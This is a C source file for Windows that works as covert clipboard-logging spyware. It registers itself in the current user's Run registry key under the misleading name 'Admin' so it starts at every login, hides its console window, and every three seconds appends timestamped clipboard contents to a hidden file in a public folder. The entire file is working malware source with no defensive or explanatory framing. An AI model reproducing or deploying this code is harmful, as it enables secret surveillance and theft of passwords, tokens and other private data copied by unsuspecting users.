#include <windows.h>
#include <stdio.h>
#include <time.h>

char* path = "C:\\Users\\Public\\Pictures\\secure.txt";
FILE* fptr;

BOOL getData() {
    time_t rawTime;
    struct tm timeInfo;
    char currentTime[80];

    time(&rawTime);
    localtime_s(&timeInfo, &rawTime);

    strftime(currentTime, sizeof(currentTime), "%Y-%m-%d %H:%M:%S", &timeInfo);

    HANDLE clipboardData;

    OpenClipboard(NULL);

    clipboardData = GetClipboardData(CF_TEXT);

    fopen_s(&fptr, path, "a+");


    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);

    fprintf(fptr, "%s: %s\n", currentTime, (char*)clipboardData);

    fclose(fptr);

    CloseClipboard();

    return TRUE;
}

int main() {

    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);

    const char* valueName = "Admin";
    const char* valueData = "C:\\Users\\Public\\Videos\\getClipboard.exe";

    RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, strlen(valueData) + 1);
    RegCloseKey(hKey);

    HWND windowHandle = GetConsoleWindow();

    ShowWindow(windowHandle, SW_HIDE);

    while (1) {
        getData();

        Sleep(3000);
    }

    return 0;
}
